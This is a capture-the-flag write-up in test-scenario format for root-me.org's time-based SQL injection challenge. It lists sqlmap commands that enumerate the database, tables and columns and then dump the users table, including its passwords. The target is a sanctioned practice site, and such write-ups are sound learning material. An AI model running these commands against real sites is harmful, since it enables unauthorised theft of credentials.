## Version 2.0
## language: en

Feature: SQL injection - Time based
  Site:
    root-me.org
  Category:
    Web-Server
  User:
    rocken2k
  Goal:
    Retrieve the administrator password

  Background:
  Hacker's software:
    | <Software name> | <Version>     |
    | Kali Linux      | 5.10.         |
    | Firefox Quantum | 68.2.0esr     |
    | SQLmap          | 1.5.2         |

  Machine information:
    Given I am accessing the website through the URL
    """
    http://challenge01.root-me.org/web-serveur/ch40/
    """
    Then I see the homepage with some links [evidence](1.png)

  Scenario: SQL injection through the URL
    Given the main page
    When I click on the "Members List" link
    Then I can see a list of all members [evidence](2.png)
    When I click on the "admin" link
    Then I see the parameter is being pass through the URL [evidence](3.png)
    And I try to pass a lot of sqli types through the URL
    But any of them seems to work
    And I can't see the flag
    And I can't solve the challenge

  Scenario: Success: Using SQLmap
    Given the name of the challenge is "time-based"
    Then I look on google how to exploit time-based sqli
    And I discover I can use a flag "--time-sec" in SQLmap
    And I use the following script
    """
    sqlmap -u "http://challenge01.root-me.org/web-serveur/ch40/?action=member
    &member=1" --time-sec=10 --current-db
    """
    When I execute the script
    Then I can see the current database name [evidence](4.png)
    And I discover a SQLI vulnerability
    And I to find the current table name I use the following script
    """
    sqlmap -u "http://challenge01.root-me.org/web-serveur/ch40/?action=member
    &member=1" --time-sec=10 -D public --tables
    """
    When I execute the script
    Then I can see the current table's name [evidence](5.png)
    And I to find the columns name I use the following script
    """
    sqlmap -u "http://challenge01.root-me.org/web-serveur/ch40/?action=member
    &member=1" --time-sec=10 -D public -T users --columns
    """
    When I execute the script
    Then I can see the columns name [evidence](6.png)
    And now that I have all the parameter I try to get the password
    And I use the following script
    """
    sqlmap -u "http://challenge01.root-me.org/web-serveur/ch40/?action=member
    &member=1" --time-sec=10 -D public -T users -C id,email,username,
    password --dump
    """
    Then I can see the flag [evidence](7.png)
    And I submit the flag
    And I solve the challenge [evidence](8.png)
